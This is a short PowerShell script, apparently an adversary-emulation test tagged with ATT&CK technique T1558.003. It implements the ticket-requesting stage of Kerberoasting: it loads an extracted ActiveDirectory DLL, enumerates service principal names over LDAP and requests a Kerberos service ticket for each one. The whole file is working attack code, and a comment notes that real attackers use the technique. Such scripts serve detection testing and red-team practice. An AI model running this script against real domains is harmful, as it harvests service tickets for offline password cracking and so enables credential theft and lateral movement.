# T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting
# We import the ActiveDirectory module without the need to install it on the current computer, the dll has been extracted from a Windows 10 x64 with RSAT installed
# technique used by real attackers
Import-Module .\Microsoft.ActiveDirectory.Management.dll

#Add System.IdentityModel to make the request
Add-Type -AssemblyName System.IdentityModel

#Create a Directory Searh Object
$searcher = New-Object System.DirectoryServices.DirectorySearcher

#Set the search base to the current domain
$searcher.SearchRoot = [System.DirectoryServices.DirectoryEntry] "LDAP://$((Get-ADDomain).DistinguishedName)"

#Set the filter to search for all SPN's
$searcher.Filter = "(&(objectCategory=computer)(serviceprincipalname=*))"

#Execute the search
$results = $searcher.FindAll()

#Loop through the results
foreach($result in $results)
{
    #Get the SPN's from each result
    $spns = $result.Properties["serviceprincipalname"]
    
    #Loop through the SPN's
    foreach($spn in $spns)
    {
        #Output the SPN
        $spn

        #Request the Ticket
        New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "$spn"
    }
}
